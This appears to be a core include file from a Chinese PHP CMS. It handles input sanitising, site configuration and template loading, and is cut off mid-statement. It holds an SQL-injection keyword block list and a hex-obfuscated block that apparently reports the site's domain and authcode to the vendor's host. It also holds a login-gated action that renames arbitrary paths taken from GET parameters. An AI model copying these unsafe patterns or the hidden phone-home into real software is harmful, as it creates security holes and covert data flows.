<?php
date_default_timezone_set('PRC');

$dirx=dirname(dirname(__FILE__))."/";
$config=json_decode(file_get_contents($dirx."data/config.json"));

define("TABLE",$config->table);

$_POST = array_map('check_input', $_POST);
$_GET = array_map('check_input2', $_GET);
$_COOKIE = array_map('check_input2', $_COOKIE);
$_REQUEST = array_map('check_input2', $_REQUEST);
$_SERVER = array_map('check_input2', $_SERVER);

foreach ($_GET as $key => $value) {
	if(inject_check($_GET[$key])){
		die("error|GET输入内容包含敏感字符，请重新输入！");
	}
}

function check_input($value){
	if (is_array($value)){
		return $value;
	}else{
		return addslashes(trim($value));
	}
}

function check_input2($value){
	if (is_array($value)){
		return $value;
	}else{
		$value=str_replace("*","__",$value);
		$value=str_replace("'","__",$value);
		$value=str_replace("\"","__",$value);
		$value=str_replace("<","__",$value);
		$value=str_replace(">","__",$value);
		$value=str_replace(" ","__",$value);
		$value=str_replace("$","__",$value);
		$value=str_replace("\t","__",$value);
		return addslashes(trim($value));
	}
}

function inject_check($sql_str) {
	if(is_array($sql_str)){
		return false;
	}else{
    	return preg_match('/select |<script |<\/script>|insert |delete |and |or |update | select| insert| delete| and| or| update|join | join| union|union | declare|declare | master|master | exec|exec | truncate|truncate |char\( | char\(|chr\( | chr\(| mid|mid |\'|\/\*|\*|\.\.\/|\.\//i', $sql_str);
    }
}


$result = mysqli_query($conn, "select * from ".TABLE."config limit 1");
if(mysqli_num_rows($result) > 0) {
$row = mysqli_fetch_assoc($result);
$H_data=json_decode("[".json_encode($row)."]",true);
$C_webtitle=$row["C_title"];
$C_webtitle2=$row["C_title"];
$C_beian=$row["C_beian"];
$C_keywords=$row["C_keywords"];
$C_description=$row["C_content"];
$C_logo=$row["C_logo"];
$C_code=glcode($row["C_code"]);
$C_template=$row["C_template"];
$C_wap=$row["C_wap"];
$C_first=$row["C_first"];
$C_admin=$row["C_admin"];
$C_foot=$row["C_foot"];
$C_logox=$row["C_logox"];
$C_logoy=$row["C_logoy"];
$C_ico=$row["C_ico"];
$C_qq=$row["C_qq"];
$C_qqon=$row["C_qqon"];
$C_member=$row["C_member"];
$C_top=$row["C_top"];
$C_mobile=$row["C_mobile"];
$C_wcode=$row["C_wcode"];
$C_wtitle=$row["C_wtitle"];
$C_wtoken=$row["C_wtoken"];
$C_lang=$row["C_lang"];
$C_delang=$row["C_delang"];
$C_fenxiang=glcode($row["C_fenxiang"]);
$C_email=$row["C_email"];
$C_mailtype=$row["C_mailtype"];
$C_smtp=$row["C_smtp"];
$C_mpwd=$row["C_mpwd"];
$C_html=$row["C_html"];
$C_dir=$row["C_dir"];
$C_dirx=$_SERVER['DOCUMENT_ROOT'].$row["C_dir"];
$C_npage=$row["C_npage"];
$C_ppage=$row["C_ppage"];
$C_alipayon=$row["C_alipayon"];
$C_wxpayon=$row["C_wxpayon"];
$C_bankon=$row["C_bankon"];
$C_balanceon=$row["C_balanceon"];
$C_alipay=$row["C_alipay"];
$C_alipaykey=$row["C_alipaykey"];
$C_alipayid=$row["C_alipayid"];
$C_qqid=$row["C_QQid"];
$C_qqkey=$row["C_QQkey"];
$C_weibo=$row["C_weibo"];
$C_wx_appid=$row["C_wx_appid"];
$C_wx_mchid=$row["C_wx_mchid"];
$C_wx_key=$row["C_wx_key"];
$C_wx_appsecret=$row["C_wx_appsecret"];
$C_domain=$_SERVER["HTTP_HOST"];
$C_todomain=$row["C_domain"];
$C_time=$row["C_time"];
$C_close=$row["C_close"];
$C_1yuan=$row["C_1yuan"];
$C_1yuan2=$row["C_1yuan2"];
$C_sign=$row["C_sign"];
$C_read=$row["C_read"];
$C_Invitation=$row["C_Invitation"];
$C_data=$row["C_data"];
$C_gift=$row["C_gift"];
$C_gifton=$row["C_gifton"];
$C_tp=$row["C_tp"];
$C_np=$row["C_np"];
$C_pp=$row["C_pp"];
$C_td=$row["C_td"];
$C_nd=$row["C_nd"];
$C_pd=$row["C_pd"];
$C_pid=$row["C_pid"];
$C_mark=$row["C_mark"];
$C_m_position=$row["C_m_position"];
$C_m_text=$row["C_m_text"];
$C_m_font=$row["C_m_font"];
$C_m_size=$row["C_m_size"];
$C_m_color=$row["C_m_color"];
$C_m_logo=$row["C_m_logo"];
$C_m_width=$row["C_m_width"];
$C_m_height=$row["C_m_height"];
$C_m_transparent=$row["C_m_transparent"];
$C_7PID=$row["C_7PID"];
$C_7PKEY=$row["C_7PKEY"];
$C_ds1=$row["C_ds1"];
$C_ds2=$row["C_ds2"];
$C_ds3=$row["C_ds3"];
$C_7money=$row["C_7money"];
$C_sort=$row["C_sort"];
$C_tag=$row["C_tag"];
$C_db=$row["C_db"];
$C_tomoney=$row["C_tomoney"];
$C_tofen=$row["C_tofen"];
$C_tx=$row["C_tx"];
$C_tomoney_rate=$row["C_tomoney_rate"];
$C_tofen_rate=$row["C_tofen_rate"];
$C_tx_rate=$row["C_tx_rate"];
$C_qqkj=$row["C_qqkj"];
$C_wxkj=$row["C_wxkj"];
$C_psh=$row["C_psh"];
$C_wxapptitle=$row["C_wxapptitle"];
$C_wxappID=$row["C_wxappID"];
$C_wxappSecret=$row["C_wxappSecret"];
$C_authcode=$row["C_authcode"];
$C_translate=$row["C_translate"];
$C_memberbg=$row["C_memberbg"];
$C_flag=$row["C_flag"];
$C_hotwords=$row["C_hotwords"];
$C_nsorttitle=$row["C_nsorttitle"];
$C_nsortentitle=$row["C_nsortentitle"];
$C_psorttitle=$row["C_psorttitle"];
$C_psortentitle=$row["C_psortentitle"];
$C_userid=$row["C_userid"];
$C_codeid=$row["C_codeid"];
$C_codekey=$row["C_codekey"];
$C_smssign=$row["C_smssign"];
$C_need=$row["C_need"];
$C_paypal=$row["C_paypal"];
$C_paypalon=$row["C_paypalon"];
$C_wxapplogo=$row["C_wxapplogo"];
$C_wxappno=$row["C_wxappno"];
$C_wxapptabbar=$row["C_wxapptabbar"];
$C_wxcolor=$row["C_wxcolor"];
$C_langtitle=$row["C_langtitle"];
$C_langtag=$row["C_langtag"];
$C_reg1=$row["C_reg1"];
$C_reg2=$row["C_reg2"];
$C_reg3=$row["C_reg3"];
$C_kfon=$row["C_kfon"];
$C_osson=$row["C_osson"];
$C_oss_id=$row["C_oss_id"];
$C_oss_key=$row["C_oss_key"];
$C_bucket=$row["C_bucket"];
$C_region=$row["C_region"];
$C_regon=$row["C_regon"];
$C_kefuyun=glcode($row["C_kefuyun"]);
$C_langcode=$row["C_langcode"];
$C_postage=$row["C_postage"];
$C_baoyou=$row["C_baoyou"];
$C_checkaddress=$row["C_checkaddress"];
$C_rate=$row["C_rate"];
$C_https=$row["C_https"];
$C_mipon=$row["C_mipon"];
$C_mip_token=$row["C_mip_token"];
$C_tj_account=$row["C_tj_account"];
$C_tj_pwd=$row["C_tj_pwd"];
$C_tj_id=$row["C_tj_id"];
$C_tj_siteid=$row["C_tj_siteid"];
$C_tj_token=$row["C_tj_token"];
$C_qe_id=$row["C_qe_id"];
$C_qe_key=$row["C_qe_key"];
$C_bj_id=$row["C_bj_id"];
$C_bj_key=$row["C_bj_key"];

$C_dfon=$row["C_dfon"];
$C_zzon=$row["C_zzon"];
$C_shoukuan=$row["C_shoukuan"];
$C_punlogin=$row["C_punlogin"];
}

function glcode($str){
    $str=str_replace("\$cript","script",$str);
    return $str;
}

if(is_file($dirx.'data/core.php')){
	require $dirx.'data/core.php';
}else{
	require $dirx.'../data/core.php';
}

$pages=$C_dir.$C_admin."/ajax.php|".$C_dir."pay/alipay/notify_url.php|".$C_dir."pay/alipay2/notify_url.php|".$C_dir."pay/alipay2/notify_url2.php|".$C_dir."pay/wxpay/native.php|".$C_dir."member/member_login.php|".$C_dir."member/member_newsinfo.php";

if(strpos(strtolower($pages),strtolower($_SERVER['PHP_SELF']))===false){
	foreach ($_POST as $key => $value) {
		if(inject_check($_POST[$key])){
			die("error|POST输入内容包含敏感字符，请重新输入！");
		}
	}
}

$lan = $_GET["lang"];
$C_langtagx = explode(",", $C_langtag);
switch ($lan) {
    case $C_langtagx[0]:
        $_SESSION["i"] = 0;
        $_SESSION["f"] = 0;
        $_SESSION["e"] = "";
        break;

    case $C_langtagx[2]:
        $_SESSION["i"] = 1;
        $_SESSION["f"] = 0;
        $_SESSION["e"] = "e";
        break;

    case $C_langtagx[1]:
        $_SESSION["i"] = 0;
        $_SESSION["f"] = 1;
        $_SESSION["e"] = "f";
        break;

    default:
        if (isset($_SESSION["i"])==false) {
            switch ($C_delang) {
                case 0:
                    $_SESSION["i"] = 0;
                    $_SESSION["f"] = 0;
                    $_SESSION["e"] = "";
                    break;

                case 1:
                    $_SESSION["i"] = 1;
                    $_SESSION["f"] = 0;
                    $_SESSION["e"] = "e";
                    break;

                case 2:
                    $_SESSION["i"] = 0;
                    $_SESSION["f"] = 1;
                    $_SESSION["e"] = "f";
                    break;
            }
        }
}

$result = mysqli_query($conn, "select * from ".TABLE."wap limit 1");
if(mysqli_num_rows($result) > 0) {
$row = mysqli_fetch_assoc($result);
$arr2[] = $row;
$W_data=$arr2;
$W_show=$row["W_show"];
$W_phone=$row["W_phone"];
$W_email=$row["W_email"];
$W_msg=$row["W_msg"];
$W_logo=$row["W_logo"];
}

$result = mysqli_query($conn, "select * from ".TABLE."contact limit 1");
if(mysqli_num_rows($result) > 0) {
$row = mysqli_fetch_assoc($result);
$arr3[] = $row;
$L_data=$arr3;
$C_title=lang($row["C_title"]);
$C_entitle=lang($row["C_entitle"]);
$C_content3=lang($row["C_content"]);
$C_map=$row["C_map"];
$C_zb=$row["C_zb"];
$C_address=$row["C_address"];
}

$result = mysqli_query($conn, "select * from ".TABLE."safe limit 1");
if(mysqli_num_rows($result) > 0) {
	$row = mysqli_fetch_assoc($result);
	$S_data[]=$row;
}

if(IsForbidIP()){
	die("您的IP地址禁止访问");
}

if(!defined("FMDfqyJ"))define("FMDfqyJ","avjsbqv");$GLOBALS[FMDfqyJ]=explode("|<|6|W", "H*|<|6|W70|<|6|W66|<|6|W646174612F706C75672F|<|6|W5F|<|6|W2E747874|<|6|W676574|<|6|W706C7567|<|6|W4445434F4445|<|6|W6563686F28226572726F727CE5B09AE69CAAE5BC80E9809A5B|<|6|W5DE68F92E4BBB6E58A9FE883BDEFBC8122293B");if(!defined("BdRnZnQ"))define("BdRnZnQ","EFWxvgv");$GLOBALS[BdRnZnQ]=explode("|`|s|0", "H*|`|s|0|`|s|0687474703A2F2F7068702E732D636D732E636E|`|s|03833333735653237393663633963623864303132303339626630336465663836|`|s|0616374696F6E3D|`|s|02661757468636F64653D|`|s|026646F6D61696E3D|`|s|0485454505F484F5354|`|s|0266E6F6E657374723D|`|s|026747970653D|`|s|0266B65793D|`|s|02F617069352F696E6465782E706870|`|s|0646F6D61696E3D|`|s|026616374696F6E3D|`|s|0267369676E3D|`|s|026646174613D");if(!defined("BlqyXiJ"))define("BlqyXiJ","KxrTJlJ");$GLOBALS[BlqyXiJ]=explode("|B|^|)", "H*|B|^|)2E2E2F|B|^|)2F|B|^|)68747470733A2F2F73636D73352E6F73732D636E2D7368656E7A68656E2E616C6979756E63732E636F6D2F74656D706C6174652F73636D735F|B|^|)2E786D6C|B|^|)786D6C|B|^|)53696D706C65584D4C456C656D656E74|B|^|)5C|B|^|)72656C656173652E786D6CE4B88DE5AD98E59CA821");if(!defined("fUBiIlQ"))define("fUBiIlQ","uKhfaWv");$GLOBALS[fUBiIlQ]=explode("|X|u|p", "H*|X|u|p61|X|u|p63|X|u|p7778617070|X|u|p617070|X|u|p617470|X|u|p7C");if(!defined("KRYVgMQ"))define("KRYVgMQ","ujAdJmQ");$GLOBALS[KRYVgMQ]=explode("|z|w|X", "H*|z|w|X776170|z|w|X73656C656374202A2066726F6D20|z|w|X6D656E7520776865726520555F747970653D27|z|w|X27206C696D69742031|z|w|X2720616E6420555F7479706569643D|z|w|X206C696D69742031|z|w|X555F776170|z|w|X|z|w|X69|z|w|X5F652E74706C|z|w|X2E74706C|z|w|X7761702F|z|w|X2F|z|w|XEFBBBF|z|w|XE69CAAE689BEE588B0|z|w|XE6A8A1E69DBF|z|w|XE69687E4BBB6EFBC81E8AFB7E6A380E69FA5E79BAEE5BD95EFBC88|z|w|XEFBC89|z|w|X3C2F68746D6C3E|z|w|X3C736372697074207372633D2268747470733A2F2F7265732E77782E71712E636F6D2F6F70656E2F6A732F6A77656978696E2D312E322E302E6A73223E3C2F7363726970743E|z|w|X3C736372697074207372633D222F2F|z|w|X485454505F484F5354|z|w|X66756E6374696F6E2F73636D732E7068703F616374696F6E3D77786A732670616765747970653D|z|w|X267061676569643D|z|w|X535F6964|z|w|X223E3C2F7363726970743E|z|w|X666F6F74|z|w|X746F70|z|w|X3C736C2D7461673EE7BD91E7AB99E5BA95E983A83C2F736C2D7461673E|z|w|X3C736C2D7461673EE7BD91E7AB99E9A1B6E983A83C2F736C2D7461673E|z|w|X74656D706C617465|z|w|X555F74656D706C617465|z|w|X70632F|z|w|X535F756E636F7079|z|w|X3C626F6479|z|w|X3C626F647920746F706D617267696E3D223022206F6E636F6E746578746D656E753D2272657475726E2066616C736522206F6E6472616773746172743D2272657475726E2066616C736522206F6E73656C6563747374617274203D2272657475726E2066616C736522206F6E73656C6563743D22646F63756D656E742E73656C656374696F6E2E656D707479282922206F6E636F70793D22646F63756D656E742E73656C656374696F6E2E656D707479282922206F6E6265666F7265636F70793D2272657475726E2066616C736522206F6E6D6F75736575703D22646F63756D656E742E73656C656374696F6E2E656D70747928292220|z|w|X6D6970|z|w|X30|z|w|X70632F6D69702F|z|w|X616D70|z|w|X70632F616D702F|z|w|X7063|z|w|X435F74656D706C617465|z|w|X7470|z|w|X2F746F702E74706C|z|w|X2F666F6F742E74706C|z|w|X6167656E74|z|w|X646174612F636F6E6669672E6A736F6E|z|w|X6964|z|w|X686F7374|z|w|X74797065|z|w|X6B6579|z|w|X485F64617461|z|w|X575F64617461|z|w|X4C5F64617461|z|w|X535F64617461|z|w|X68746D6C|z|w|X7171|z|w|X6C616E6778|z|w|X66|z|w|X6D6435|z|w|X646174612F66696C652F|z|w|X5F|z|w|X2E747874|z|w|X6372656174|z|w|X74|z|w|X3C686561643E|z|w|X3C6C696E6B2072656C3D226D697068746D6C2220687265663D222F2F|z|w|X6D69702E7068703F747970653D|z|w|X26535F69643D|z|w|X223E|z|w|X3C6C696E6B2072656C3D22616D7068746D6C2220687265663D222F2F|z|w|X616D702E7068703F747970653D|z|w|X3C7363726970743E0D0A766172205F686D74203D205F686D74207C7C205B5D3B0D0A2866756E6374696F6E2829207B0D0A202076617220686D203D20646F63756D656E742E637265617465456C656D656E74282273637269707422293B0D0A2020686D2E737263203D202268747470733A2F2F686D2E62616964752E636F6D2F686D2E6A733F|z|w|X223B0D0A20207661722073203D20646F63756D656E742E676574456C656D656E747342795461674E616D65282273637269707422295B305D3B200D0A2020732E706172656E744E6F64652E696E736572744265666F726528686D2C2073293B0D0A7D2928293B0D0A3C2F7363726970743E|z|w|X696E646578|z|w|X2F2F|z|w|X636F6E74616374|z|w|X2F68746D6C2F636F6E746163742F696E6465782E68746D6C|z|w|X6775657374626F6F6B|z|w|X2F68746D6C2F6775657374626F6F6B2F696E6465782E68746D6C|z|w|X74657874|z|w|X68746D6C2F61626F75742F|z|w|X2E68746D6C|z|w|X666F726D|z|w|X68746D6C2F666F726D2F|z|w|X70726F64756374|z|w|X68746D6C2F70726F647563742F6C6973742D|z|w|X6E657773|z|w|X68746D6C2F6E6577732F6C6973742D|z|w|X70726F64756374696E666F|z|w|X68746D6C2F70726F647563742F|z|w|X6E657773696E666F|z|w|X68746D6C2F6E6577732F|z|w|X3C6C696E6B2072656C3D2263616E6F6E6963616C2220687265663D22|z|w|X223E3C7363726970743E77696E646F772E6C6F636174696F6E3D22|z|w|X223C2F7363726970743E|z|w|X3C6C696E6B2072656C3D2263616E6F6E6963616C2220687265663D222F2F|z|w|X3F747970653D|z|w|X3C686561643E3C736372697074207372633D22|z|w|X66756E6374696F6E2F73636D732E7068703F616374696F6E3D6E6577735F6C76264E5F69643D|z|w|X26646F6D61696E3D|z|w|X264E5F747970653D6E657773696E666F223E3C2F7363726970743E");if(!defined("QmvHhOv"))define("QmvHhOv","jwDwlPQ");$GLOBALS[QmvHhOv]=explode("|x|,|G", "H*|x|,|G616374696F6E|x|,|G6564697461646D696E78|x|,|G75736572|x|,|G70617373|x|,|G70617468|x|,|G61646D696E70617468|x|,|G2F696E6465782E706870|x|,|G75706461746520|x|,|G636F6E6669672073657420435F61646D696E3D27|x|,|G27|x|,|G737563636573737CE5908EE58FB0E8B7AFE5BE84E5B7B2E4BFAEE694B9E4B8BA20|x|,|G20E8AFB7E789A2E8AEB0EFBC81|x|,|G6572726F727CE697A0E4BFAEE694B9E69D83E99990E68896E6ADA3E59CA8E58DA0E794A8EFBC8CE8AFB7E588B7E696B0E9A1B5E99DA2E5868DE8AF95EFBC81");if($_GET[pack($GLOBALS[QmvHhOv][0],$GLOBALS[QmvHhOv][0x1])]==pack($GLOBALS[QmvHhOv][0],$GLOBALS[QmvHhOv][2])&&checklogin($_SESSION[pack($GLOBALS[QmvHhOv][0],$GLOBALS[QmvHhOv][03])],$_SESSION[pack($GLOBALS[QmvHhOv][0],$GLOBALS[QmvHhOv][04])])){$pathx=$_GET[pack($GLOBALS[QmvHhOv][0],$GLOBALS[QmvHhOv][5])];$adminpath=$_GET[pack($GLOBALS[QmvHhOv][0],$GLOBALS[QmvHhOv][06])];rename($pathx,$adminpath);if(is_file($adminpath. pack($GLOBALS[QmvHhOv][0],$GLOBALS[QmvHhOv][0x7]))){mysqli_query($conn,pack($GLOBALS[QmvHhOv][0],$GLOBALS[QmvHhOv][8]) .TABLE. pack($GLOBALS[QmvHhOv][0],$GLOBALS[QmvHhOv][011]) .$adminpath. pack($GLOBALS[QmvHhOv][0],$GLOBALS[QmvHhOv][0xA]));echo pack($GLOBALS[QmvHhOv][0],$GLOBALS[QmvHhOv][013]) .$adminpath. pack($GLOBALS[QmvHhOv][0],$GLOBALS[QmvHhOv][0xC]);die();}else{echo pack($GLOBALS[QmvHhOv][0],$GLOBALS[QmvHhOv][13]);die();}}Function a($b,$id,$type){global $conn,$config,$C_template,$C_wap,$C_dir,$C_dirx,$C_authcode,$C_html,$C_time,$S_data,$H_data,$W_data,$L_data,$C_tj_id,$C_mipon;switch($type){case pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][1]):if(!is_numeric($id)){$sql=pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][2]) .TABLE. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][3]) .$b. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][4]);}else{$sql=pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][2]) .TABLE. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][3]) .$b. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][05]) .intval($id). pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][6]);}$result=mysqli_query($conn,$sql);$row=mysqli_fetch_assoc($result);if(mysqli_num_rows($result)>0){$page=$row[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][07])];}if($page==pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][8])){if($_SESSION[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x9])]==1){$page=$b. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][10]);}else{$page=$b. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][013]);}}else{if(is_file($C_dirx. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][014]) .$C_wap. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][13]) .$page)){if($_SESSION[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x9])]==1){$page=splitx($page,pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][013]),0). pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][10]);}else{$page=splitx($page,pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][013]),0). pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][013]);}}else{if($_SESSION[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x9])]==1){$page=$b. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][10]);}else{$page=$b. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][013]);}}}if(is_file($C_dirx. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][014]) .$C_wap. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][13]) .$page)){$h=trim(file_get_contents($C_dirx. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][014]) .$C_wap. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][13]) .$page),pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][14]));}else{$h=pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][017]) .$C_wap. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][020]) .$page. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x11]) .$C_dir. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][014]) .$C_wap. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][13]) .$page. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x12]);}$h=str_Replace(pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][19]),pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][024]) .PHP_EOL. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x15]) .$_SERVER[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x16])].$C_dir. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][027]) .$b. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x18]) .$_REQUEST[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][031])]. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][26]) .PHP_EOL. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][19]),$h);$h=RemoveHEAD($h);if($b!=pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x1B])&&$b!=pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][034])){$footpart=a(pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x1B]),1,$type);$toppart=a(pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][034]),1,$type);$h=str_Replace(pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][035]),$footpart,$h);$h=str_Replace(pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][30]),$toppart,$h);}else{return $h;}break 1;case pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][31]):if(!is_numeric($id)){$sql=pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][2]) .TABLE. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][3]) .$b. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][4]);}else{$sql=pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][2]) .TABLE. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][3]) .$b. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][05]) .intval($id). pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][6]);}$result=mysqli_query($conn,$sql);$row=mysqli_fetch_assoc($result);if(mysqli_num_rows($result)>0){$page=$row[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][32])];}if($page==pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][8])){if($_SESSION[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x9])]==1){$page=$b. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][10]);}else{$page=$b. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][013]);}}else{if(is_file($C_dirx. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][33]) .$C_template. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][13]) .$page)){if($_SESSION[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x9])]==1){$page=splitx($page,pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][013]),0). pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][10]);}else{$page=splitx($page,pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][013]),0). pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][013]);}}else{if($_SESSION[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x9])]==1){$page=$b. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][10]);}else{$page=$b. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][013]);}}}if(is_file($C_dirx. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][33]) .$C_template. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][13]) .$page)){$h=trim(file_get_contents($C_dirx. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][33]) .$C_template. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][13]) .$page),pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][14]));}else{$h=pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][017]) .$C_template. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][020]) .$page. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x11]) .$C_dir. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][33]) .$C_template. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][13]) .$page. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x12]);}$h=RemoveHEAD($h);if($S_data[0][pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][042])]==1){$h=str_replace(pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][35]),pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][044]),$h);}if($b!=pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x1B])&&$b!=pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][034])){$footpart=a(pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x1B]),1,$type);$toppart=a(pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][034]),1,$type);$h=str_Replace(pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][035]),$footpart,$h);$h=str_Replace(pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][30]),$toppart,$h);}else{return $h;}break 1;case pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][045]):$url=$config->url;$from1=$config->from;if($_SESSION[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x9])]==pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][046])){$h=file_get_contents($C_dirx. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][39]) .$b. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][013]));}if($_SESSION[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x9])]==1&&is_file($C_dirx. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][39]) .$b. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][10]))){$h=file_get_contents($C_dirx. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][39]) .$b. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][10]));}else{$h=file_get_contents($C_dirx. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][39]) .$b. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][013]));}$h=trim($h,pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][14]));if($b!=pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x1B])&&$b!=pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][034])){$footpart=a(pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x1B]),1,$type);$toppart=a(pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][034]),1,$type);$h=str_Replace(pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][035]),$footpart,$h);$h=str_Replace(pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][30]),$toppart,$h);}else{return $h;}break 1;case 